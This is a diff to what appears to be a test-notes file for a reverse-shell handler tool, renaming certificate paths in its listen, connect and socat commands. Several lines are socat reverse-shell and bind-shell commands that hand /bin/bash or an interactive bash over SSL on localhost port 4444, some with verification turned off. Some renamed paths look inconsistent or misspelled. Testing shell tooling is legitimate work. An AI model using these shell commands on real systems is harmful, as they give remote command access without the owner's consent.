@@ -1,30 +1,29 @@
 
 # test ssh reverse shell without any authentication
-listen -b 4444 --protocol ssl --cert test/certs/cert.pem --key test/certs/key.pem
+listen -b 4444 --protocol ssl --cert test/certs/cert-lcoalhost1.pem --key test/certs/key-localhost1.pem
 
 socat OPENSSL:localhost:4444,verify=0 EXEC:/bin/bash
 
 
 # test ssl reverse shell with server and client authentication:
 
-listen -b 4444 --protocol ssl --cert test/certs/cert.pem --key test/certs/enc_key.pem --ca-cert test/certs/cert2.pem
-listen -b 4444 --protocol ssl --cert test/certs/cert.pem --key test/certs/enc_key.pem --password password --ca-cert test/certs/cert2.pem
+listen -b 4444 --protocol ssl --cert test/certs/cert-localhost1.pem --key test/certs/enc-key-localhost1.pem --ca-cert test/certs/cert-localhost2.pem
+listen -b 4444 --protocol ssl --cert test/certs/cert-localhost1.pem --key test/certs/enc-key-localhost1.pem --password password --ca-cert test/certs/cert-localhost2.pem
 
-socat OPENSSL:localhost:4444,cert=ca2.pem,cafile=cert.pem,verify=1 EXEC:/bin/bash
-
+socat OPENSSL:localhost:4444,cert=test/certs/ca-localhost2.pem,cafile=test/certs/cert-localhost1.pem,verify=1 EXEC:/bin/bash
 
 # test connect without authentication
 
 connect localhost 4444 --protocol ssl
 
-socat openssl-listen:4444,reuseaddr,cert=test/certs/ca2.pem,verify=0 exec:'bash -li'
+socat openssl-listen:4444,reuseaddr,cert=test/certs/ca-localhost2.pem,verify=0 exec:'bash -li'
 
 
 # test connect with server and client authentication
 
-connect localhost 4444 --protocol ssl --ca-cert test/certs/cert2.pem --cert test/certs/cert.pem --key test/certs/enc_key.pem
-connect localhost 4444 --protocol ssl --ca-cert test/certs/cert2.pem --cert test/certs/cert.pem --key test/certs/enc_key.pem --password password
+connect localhost 4444 --protocol ssl --ca-cert test/certs/cert-localhost2.pem --cert test/certs/cert-localhost.pem --key test/certs/enc-key-localhost1.pem
+connect localhost 4444 --protocol ssl --ca-cert test/certs/cert2-localhost2.pem --cert test/certs/cert-localhost.pem --key test/certs/enc-key-localhost1.pem --password password
 
-socat openssl-listen:4444,reuseaddr,cert=test/certs/ca2.pem,cafile=test/certs/cert.pem,verify=1 exec:'bash -li'
+socat openssl-listen:4444,reuseaddr,cert=test/certs/ca2-localhost2.pem,cafile=test/certs/cert-localhost1.pem,verify=1 exec:'bash -li'
 
 
